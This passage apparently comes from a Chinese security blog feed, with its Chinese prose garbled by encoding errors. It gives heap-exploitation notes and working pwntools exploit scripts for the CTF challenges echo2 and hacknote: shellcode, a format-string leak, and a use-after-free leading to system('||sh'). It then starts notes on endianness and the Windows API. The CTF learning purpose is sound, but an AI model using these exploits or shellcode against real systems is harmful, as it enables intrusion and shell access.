é€åˆ°pieä¸­ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> * p = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619195914454.png" alt="image-20230619195914454"></p><p>tipsï¼š<br>1.glibc2.26&#x2F;2.27ä¸­æ— tacheæ£€æŸ¥<br>2.fast binä¼šæ£€æŸ¥è‡ªèº«é“¾è¡¨ä¸­æ¯ä¸€ä¸ªchunkå¤§å°æ˜¯å¦ä¸ºè§„å®šå¤§å°||æ–°è¿›å…¥çš„chunkæ˜¯å¦ä¸ä¸Šä¸€ä¸ªchunké‡å¤ï¼ˆæŠ¥double free å¼ºåˆ¶é€€å‡ºï¼‰</p><p>ç»•è¿‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span>* p = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="type">int</span>* ptr = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="built_in">free</span>(ptr);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastbin_attack<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619202854520.png" alt="image-20230619202854520"></p><p>freeåfdå‡ºç° æ­¤æ—¶æ­¤å—chunkå¯¹äºdæ¥è¯´ä¸ºmalloc chunkå¯è¢«ä»»æ„å†™å…¥å€¼ï¼ˆfdå¤„ï¼‰<br>fdå†™å…¥ä¸€ä¸ªstackå€¼ è¯ˆéª—fast binè¿‡aåä¸‹ä¸€ä¸ªfree chunkåœ¨æ ˆä¸Š ã€ä»»æ„éœéœå®ç°ã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203751739.png" alt="image-20230619203751739"><br>æ³¨æ„ï¼šfdå§‹ç»ˆæŒ‡å‘ä¸‹ä¸€ä¸ªchunkå¼€å¤´åœ°å€ å³stackå¯¹åº”æ ˆä¸Šç›®æ ‡åœ°å€å‘ä¸Šä¸¤ä¸ªå­—é•¿</p><p><strong>unsorted_bin_attcak</strong><br>å¯ä»¥æŠŠä»»æ„ä½ç½®çš„åœ°å€ç¯¡æ”¹æˆè¾ƒå¤§çš„å€¼ï¼ˆå®é™…å°±æ˜¯ä¼ªé€ chunkåœ¨æ ˆä¸Šå†™ä¸€ä¸ªå¤§æ•°å€¼ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619205339973.png" alt="image-20230619205339973"></p><p>ç¨‹åºç›®æ ‡å°†varç¯¡æ”¹ä¸ºè¾ƒå¤§å€¼<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619205857320.png" alt="image-20230619205857320"></p><p>unlinkç§»é™¤ä¸­é—´çš„chunk  æ–°fdå’Œbkä¸­å¡«å…¥unsorted binä¸­å€¼ï¼ˆfdå’Œbkæ•°æ®åŸŸå†™å…¥unsorted åœ°å€ï¼‰æœ€å¤§0x7ffâ€¦<br><strong>house_ofç³»åˆ—</strong><br>mallocæ€»æ˜¯æ¥æ”¶ä¸€ä¸ªæ— ç¬¦å·æ•´æ•° è¾“å…¥è´Ÿæ•°ç›¸å½“äºä¼ å…¥ä¸€ä¸ªè¶…å¤§æ•°<br>æ•´æ•°æº¢å‡ºï¼ˆè¶…å¤§æ•´æ•°ç­‰æ•ˆäºä¸€ä¸ªè´Ÿæ•°ï¼‰<br>top chunkèµ·å§‹åœ°å€ + mallocåˆ†é…ç©ºé—´è¶…å‡ºæ•´æ•°å†…å­˜ç©ºé—´å¤§å°â€“ä¸¢å¼ƒè¶…å‡º32ä½éƒ¨åˆ†ï¼ˆæœ€é«˜ä½ï¼‰è¡¥0 å‰©ä¸‹æ•°å­—å˜å¾ˆå°ï¼ˆ32ä½è¡¨ç¤ºç©ºé—´å¤§å°ï¼‰</p><p>æ­¤æ—¶è¿™ä¸ªå¾ˆå°çš„æ•°å¾ˆå¯èƒ½è½åœ¨dataå¤„ï¼ˆï¼Ÿï¼‰</p><p><strong>FSB&amp;USFä¾‹é¢˜</strong><br>(1)IDAè§‚å¯Ÿ<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155645246.png" alt="image-20230620155645246"></p><p>scanfå‘v7ã€v8ã€v9å†™å­—ç¬¦ä¸²ï¼ˆå¼€è¾Ÿçš„ç©ºé—´æ˜¯è¿ç»­çš„ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620161845271.png" alt="image-20230620161845271"></p><p>è¿ç»­çš„ä¸‰ä¸ªå­—é•¿ç¼“å†²åŒº<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620162028689.png" alt="image-20230620162028689">å‘ç°ç¨‹åºæ ‡è®°æç¤ºè¿›å…¥å¯¹åº”æ¼æ´æŸ¥çœ‹<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155732238.png" alt="image-20230620155732238"></p><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155800172.png" alt="image-20230620155800172"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155817628.png" alt="image-20230620155817628"></p><p>freeï¼ˆsï¼‰æ¸…ç©ºäº†å†…å­˜ä½†æŒ‡é’ˆæœªé”€æ¯ä½†éšç€echo3æ‰§è¡Œå®Œæ¯•å¯¹åº”sæ ˆå¸§é”€æ¯æ•…æ— å½±å“ ä½† cleanupï¼ˆï¼‰å‡½æ•°freeï¼ˆ0ï¼‰å¯¹åº”uaf å³oå†…å­˜è¢«æ¸…ç©ºä½†æŒ‡é’ˆæœªè¢«é”€æ¯ æ­¤æ—¶å†ç”¨å¦ä¸€æŒ‡é’ˆä¸oæŒ‡å‘åŒä¸€å†…å­˜ç©ºé—´å³å¯è·å–ä¸»åŠ¨æƒ</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620174531638.png" alt="    ">å— </p><p>surprise<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620201633271.png" alt="image-20230620201633271"></p><p>echo3freeåsä½¿ç”¨çš„ç©ºé—´æœ€åè¿˜æ˜¯ç•™åœ¨å¯¹åº”å¾—4å­—é•¿chunkä¸­  oæœ€åä¸€ä¸ªå‚æ•°å†™å…¥shellcodeï¼ˆgreetingï¼‰ é¦–åœ°å€ä½œä¸ºå‚æ•°è¿›è¡Œä¼ å‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;hey, what&#x27;s your name? : &quot;</span>)</span><br><span class="line">shellcode=<span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%10$p&quot;</span>+<span class="string">b&quot;A&quot;</span>*<span class="number">3</span> <span class="comment">#Aç”¨ä½œæ ‡è®°</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">shellcode_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;AAA&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;to exit? (y/n)&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;hello \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">24</span>+p64(shellcode_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>hacknoteï¼ˆ32ä½ï¼‰</strong><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620231326851.png" alt="image-20230620231326851"></p><p>â€‹                   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221606653.png" alt="image-20230620221606653"><br>addå‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221355683.png" alt="image-20230620221355683"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620220117301.png" alt="image-20230620220117301"></p><p>æ¡†ä½éƒ¨åˆ†æŒæ¡æ§åˆ¶ä¿¡æ¯ sizeå¯¹åº”çš„chunkå¯ç”±ç”¨æˆ·è‡ªå®šä¹‰ï¼ˆuafï¼‰controlä¸Šæœªputs ä¸‹ä¸ºsub</p><p>deleteå‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222639346.png"></p><p>ç”±ä¸‹è‡ªä¸Šfreeä¸¤ä¸ªchunk ä½†æŒ‡é’ˆæœªè¢«é”€æ¯ åŒfreeï¼ˆuafï¼‰<br>æ”»å‡»ç¬¬ä¸€æ­¥ï¼š<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222239841.png" alt="image-20230620222239841"></p><p>mallocä¸¤æ¬¡ï¼ˆå†™å…¥åƒåœ¾æ•°æ®çš„chunk+ç®¡ç†æ§åˆ¶ä¿¡æ¯çš„chunkï¼‰</p><p>ç¬¬äºŒæ­¥<br>deleteä¸¤ä¸ªchunk ç›¸åŒå¤§å°chunkè¿›å…¥åŒä¸€fast bin self_putsç¬¬ä¸€ä¸ªå­—é•¿å˜ä¸ºfdçš„ç¬¬ä¸€ä¸ªå…¶ä»–æœªå˜ï¼ˆåŒ…æ‹¬æŒ‡é’ˆï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222903872.png"></p><p>mallocä¸¤æ¬¡houå<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620223247527.png" alt="image-20230620223247527"></p><p>ä¼ å‚ç”¨self_puts åœ°å€  sub_chunkå†™å…¥â€”&gt;puts_got<br>æ³„éœ²</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620224148329.png" alt="image-20230620224148329"></p><p>printï¼ˆ0ï¼‰å¯¹æ¥è¿œç¨‹çš„puts<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230216527.png"></p><p>0æ­¤æ—¶ä¿å­˜çš„å‡½æ•°åœ°å€ è·å–0çš„åœ°å€è¿›è€Œåˆ©ç”¨ä¸¤ä¸ªchunkå—<br>0ä¸­ç¬¬ä¸€éƒ¨åˆ†ä¼ å…¥systemåœ°å€ï¼ˆæ— å¯é¿å…ï¼‰ç”¨||ï¼ˆæˆ–ï¼‰shã€å‰ä¸€æ¡è¯­å¥æ‰§è¡Œå¤±è´¥åˆ™æ‰§è¡Œshã€‘å¦™å“‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230551936.png" alt="image-20230620230551936"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = remote(&quot;chall.pwnable.tw&quot;,10102)</span></span><br><span class="line">p=process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">pfputs = <span class="number">0x804862b</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">size,index</span>):</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">      p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;size :&quot;</span>)</span><br><span class="line">      p.sendline(size)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;Content :&quot;</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_note</span>(<span class="params">index</span>):</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">      p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_note</span>(<span class="params">index</span>):</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">      p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b&quot;16&quot;</span>,<span class="string">b&quot;aaaaa&quot;</span>)</span><br><span class="line">add_note(<span class="string">b&quot;16&quot;</span>,<span class="string">b&quot;aaaaa&quot;</span>)</span><br><span class="line">delete_note(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">delete_note(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add_note(<span class="string">b&#x27;8&#x27;</span>,p32(pfputs)+p32(read_got))</span><br><span class="line">print_note(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pfread = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">pfsys = pfread - <span class="number">0xd41c0</span> + <span class="number">0x3a940</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">delete_note(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b&#x27;8&#x27;</span>,p32(pfsys)+<span class="string">b&quot;||sh&quot;</span>)</span><br><span class="line">print_note(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> äºŒè¿›åˆ¶å®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è§£å¯†ç³»åˆ—basic</title>
      <link href="/2023/09/01/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%5B%E5%9F%BA%E7%A1%80%E7%AF%87%5D/"/>
      <url>/2023/09/01/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%5B%E5%9F%BA%E7%A1%80%E7%AF%87%5D/</url>
      
        <content type="html"><![CDATA[<p><em>è§£å¯†ç³»åˆ—[åŸºç¡€ç¯‡]</em></p><h3 id="å¤šå­—èŠ‚å­˜å‚¨é¡ºåº"><a href="#å¤šå­—èŠ‚å­˜å‚¨é¡ºåº" class="headerlink" title="å¤šå­—èŠ‚å­˜å‚¨é¡ºåº"></a><strong>å¤šå­—èŠ‚å­˜å‚¨é¡ºåº</strong></h3><p>ä¸¤ç§ç¼–ç åŒºåˆ«:<br>**Big-Endian:**é«˜ä½å­—èŠ‚å­˜å…¥ä½åœ°å€ï¼Œä½ä½å­—èŠ‚å­˜å…¥é«˜åœ°å€ï¼Œä¾æ¬¡æ’åˆ—ã€‚<br>**Little-Endian :**ä½ä½å­—èŠ‚å­˜å…¥ä½åœ°å€ï¼Œé«˜ä½å­—èŠ‚å­˜å…¥é«˜åœ°å€ï¼Œååºæ’åˆ—         å¤šå­—èŠ‚æ•°æ®å­˜æ”¾é¡ºåºä¸CPUæœ‰å…³ã€‚</p><p>å¾®å¤„ç†å™¨ä¸­å­˜æ”¾é¡ºåºæœ‰æ­£åºï¼ˆ Big-Endianï¼‰å’Œé€†åº(Little-Endianï¼‰ (ä¹Ÿç§°å¤§ç«¯å­˜å‚¨å’Œå°ç«¯å­˜å‚¨)ä¹‹åˆ†ã€‚<br>å¸¸è§çš„Intelç³»åˆ—ä½¿ç”¨çš„ç¼–ç æ–¹å¼å±äºLittle-Endianç±»ï¼›æŸäº›RISCæ¶æ„çš„CPUÂ·OIBM6Power-PCç­‰å±äºBig-Endianç±»ã€‚</p><p>è¡¥å……ï¼šASCII ï¼ˆ American Standard Code for InformationInterchangeÂ·ç¾å›½ä¿¡æ¯äº’æ¢æ ‡å‡†ä»£ç ) 0-256ã€‚<br>Unicodeå­—ç¬¦ç¼–ç çš„ç¼–ç èŒƒå›´æ˜¯ï¸°0-65535Â·å®ƒåŒ…å«ä¸‰å¥—ç¼–ç æ–¹å¼å¦‚ :UTF-8Â·UTF-16å’ŒUTF-32Â·å®ƒå’ŒASCIIçš„å…³ç³»ä¸ºASCIIå­—ç¬¦ç¼–ç æ˜¯Unicodeå­—ç¬¦ç¼–ç çš„ä¸€éƒ¨åˆ†ã€‚</p><h3 id="Win-APIç®€ä»‹"><a href="#Win-APIç®€ä»‹" class="headerlink" title="Win APIç®€ä»‹:"></a><strong>Win APIç®€ä»‹:</strong></h3><p>Windows APIå°±æ˜¯windowsåº”ç”¨ç¨‹åºæ¥å£ï¼Œæ˜¯é’ˆå¯¹microsoft windowsæ“ä½œç³»ç»Ÿå®¶æ—çš„ç³»ç»Ÿç¼–ç¨‹æ¥å£ï¼Œè¿™æ ·çš„ç³»ç»ŸåŒ…æ‹¬Windows 7 Â·Windows Vista - WindowsXP -Windows Server 2003 Â·Windows 2000-Windows95 Â·Windows 98-Windows Me (Millennium Editonï¼‰å’ŒOWindows CEç­‰å‡ ä¹æ‰€æœ‰ç‰ˆæœ¬ã€‚å®ƒè¢«è®¾è®¡ä¸ºå„ç§è¯­è¨€çš„ç¨‹åºè°ƒç”¨ï¼Œä¹Ÿæ˜¯åº”ç”¨è½¯ä»¶ä¸Windowsç³»ç»Ÿæœ€ç›´åŸ¹çš„äº¤äº’æ–¹å¼ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/IZFRQK66[MK~]3S%7D62$Y4KJ.png" alt="img"></p><p><strong>åŠ¨æ€é“¾æ¥åº“</strong>ï¸°åŠ¨æ€é“¾æ¥å°±æ˜¯æŠŠä¸€äº›ç»å¸¸ä¼šå…±ç”¨çš„ä»£ç ï¼ˆé™æ€é“¾åŸ¹çš„OBJç¨‹åºåº“ï¼‰åˆ¶ä½œæˆDLLæ–‡ä»¶ã€‚å½“å¯æ‰§è¡Œæ–‡ä»¶è°ƒç”¨åˆ°DLLæ–‡ä»¶å†…çš„å‡½æ•°æ—¶windowsæ“ä½œç³»ç»Ÿæ‰ä¼šæŠŠDLLæ–‡ä»¶åŠ è½½å­˜å‚¨å™¨å†…ã€‚<br>DLLæ–‡ä»¶æœ¬èº«çš„ç»“æ„å°±æ˜¯æ‰§iè¡Œæ–‡ä»¶ï¼ˆPEï¼‰ ,å½“ç¨‹åºéœ€æ±‚å‡½æ•°æ‰è¿›è¡Œé“¾æ¥ï¼Œé€šè¿‡åŠ¨æ€é“¾æ¥æ–¹å¼ï¼Œå­˜å‚¨å™¨æµªè´¹çš„æƒ…å½¢å°†å¤§å¹…é™ä½ã€‚                           <strong>kernel32.dll</strong>:æ§åˆ¶ç€ç³»ç»Ÿçš„å†…å­˜ç®¡ç†ï¹‘æ•°æ®çš„è¾“å…¥è¾“å‡ºæ“ä½œå’Œä¸­æ–­å¤„ç†ã€‚å½“Windowså¯åŠ¨æ—¶ï¼Œkernel32.dllå°±é©»ç•™åœ¨å†…å­˜ä¸­ç‰¹å®šçš„å†™ä¿æŠ¤åŒºåŸŸï¼Œä½¿åˆ«çš„ç¨‹åºæ— æ³•å ç”¨è¿™ä¸ªå†…å­˜åŒºåŸŸã€‚<br><strong>user32.dll</strong>: Windowsç”¨æˆ·ç•Œé¢ç›¸å…³åº”ç”¨ç¨‹åºæ¥å£ï¼Œç”¨äºåŒ…æ‹¬Windowså¤„ç†ã€åŸºæœ¬ç”¨æˆ·ç•Œé¢ç­‰ç‰¹æ€§ã€‚å¦‚åˆ›å»ºçª—å£å’Œå‘é€æ¶ˆæ¯ã€‚<br><strong>gdi32.dll</strong>:æ˜¯Windows GDIå›¾å½¢ç”¨æˆ·ç•Œé¢ç›¸å…³ç¨‹åºï¼ŒåŒ…å«çš„å‡½æ•°ç”¨æ¥ç»˜åˆ¶å›¾åƒå’Œæ˜¾ç¤ºæ–‡å­—ã€‚   </p><p><strong>å¥æŸ„</strong>ï¼šæ˜¯æ•´ä¸ªwindowsç¼–ç¨‹çš„åŸºç¡€ã€‚<u>ä¸€ä¸ªå¥æŸ„æ˜¯æŒ‡ä½¿ç”¨çš„ä¸€ä¸ªå”¯ä¸€çš„æ•´æ•°å€¼</u><u>ï¼Œç”¨äºæ ‡å¿—åº”ç”¨ç¨‹åºä¸­çš„ä¸åŒå¯¹è±¡å’ŒåŒç±»å¯¹è±¡ä¸­çš„ä¸åŒçš„å®ä¾‹</u>ã€‚<br>ä¾‹ï¼šä¸€ä¸ªçª—å£ï¼ŒæŒ‰é’®ï¼Œå›¾æ ‡ï¼Œæ»šåŠ¨æ¡ï¼Œè¾“å‡ºè®¾å¤‡ï¼Œæ§ä»¶æˆ–è€…æ–‡ä»¶ç­‰ã€‚åº”ç”¨ç¨‹åºèƒ½å¤Ÿé€šè¿‡å¥æŸ„è®¿é—®ç›¸åº”çš„å¯¹è±¡çš„ä¿¡æ¯ã€‚<br>å¥æŸ„æ˜¯windowsç”¨æ¥æ ‡å¿—åº”ç”¨ç¨‹åºä¸­å»ºç«‹çš„æˆ–æ˜¯ä½¿ç”¨çš„å”¯ä¸€æ•´æ•°windowsä½¿ç”¨äº†å¤§é‡çš„å¥æŸ„æ¥æ ‡å¿—å¾ˆå¤šå¯¹è±¡ã€‚</p><p>HWndï¼šå¸¦æ–‡æœ¬çš„çª—å£æˆ–æ§ä»¶çš„å¥æŸ„ã€‚<br>IpStringï¼šæŒ‡å‘æ¥æ”¶æ–‡æœ¬çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚<br>nMaxCountï¼šæŒ‡å®šè¦ä¿å­˜åœ¨ç¼“å†²åŒºå†…çš„å­—ç¬¦çš„æœ€å¤§ä¸ªæ•°ï¼Œå…¶ä¸­åŒ…å«NULLå­—ç¬¦      </p><h3 id="HWND-GetDlgItemå‡½æ•°"><a href="#HWND-GetDlgItemå‡½æ•°" class="headerlink" title="HWND GetDlgItemå‡½æ•°"></a><strong>HWND GetDlgItemå‡½æ•°</strong></h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hwndScroll</span> = GetDlgItem(hwnd, IDC_SCROLL)<span class="comment">;       </span></span><br></pre></td></tr></table></figure><p> å‡è®¾ä¸€ä¸ªçˆ¶çª—å£ä¸­æœ‰å¤šä¸ªå­çª—å£ï¼Œé‚£ä¹ˆæœ¬å‡½æ•°æ˜¯è¿”å›ä¸€ä¸ªå­çª—å£å¥æŸ„ã€‚ç¬¬ä¸€ä¸ªå‚æ•°ï¼šçˆ¶çª—å£å¥æŸ„     ç¬¬äºŒä¸ªå‚æ•°ï¼šå­çª—å£    UINT </p><h3 id="IDUINT-GetDlgItemTextå‡½æ•°"><a href="#IDUINT-GetDlgItemTextå‡½æ•°" class="headerlink" title="IDUINT GetDlgItemTextå‡½æ•°"></a><strong>IDUINT GetDlgItemTextå‡½æ•°</strong></h3><p>â€‹<br>ï¼ˆæ£€ç´¢ä¸å¯¹è¯æ¡†ä¸­çš„æ§ä»¶å…³è”çš„æ ‡é¢˜æˆ–æ–‡æœ¬ï¼‰                                                                                 </p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GetDlgItemText(</span><br><span class="line">  <span class="keyword">HWND</span> hDlg,       <span class="comment">// handle to dialog box</span></span><br><span class="line">  <span class="keyword">int</span> nIDDlgItem,  <span class="comment">// control identifier</span></span><br><span class="line">  LPTSTR lpString, <span class="comment">// pointer to buffer for text</span></span><br><span class="line">  <span class="keyword">int</span> nMaxCount    <span class="comment">// maximumsize of string</span></span><br><span class="line">)<span class="comment">;                                      </span></span><br></pre></td></tr></table></figure><h3 id="GetwindowTextå‡½æ•°"><a href="#GetwindowTextå‡½æ•°" class="headerlink" title="GetwindowTextå‡½æ•°"></a><strong>GetwindowTextå‡½æ•°</strong></h3><p>å°†æŒ‡å®šçª—å£çš„æ ‡é¢˜æ¡æ–‡æœ¬ï¼ˆå¦‚æœå­˜åœ¨ï¼‰æ‹·è´åˆ°ä¸€ä¸ªç¼“å­˜åŒºå†…ã€‚             å¦‚æœæŒ‡å®šçš„çª—å£æ˜¯ä¸€ä¸ªæ§ä»¶ï¼Œåˆ™æ‹·è´æ§ä»¶çš„æ–‡æœ¬ã€‚                <u>GetWindowTextä¸èƒ½æ¥æ”¶åœ¨å…¶ä»–åº”ç”¨ç¨‹åºä¸­çš„æ§ä»¶çš„æ–‡æœ¬ã€‚</u></p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> GetWindowText(</span><br><span class="line">  <span class="keyword">HWND</span> <span class="keyword">hWnd</span>,        <span class="comment">// handle to window or 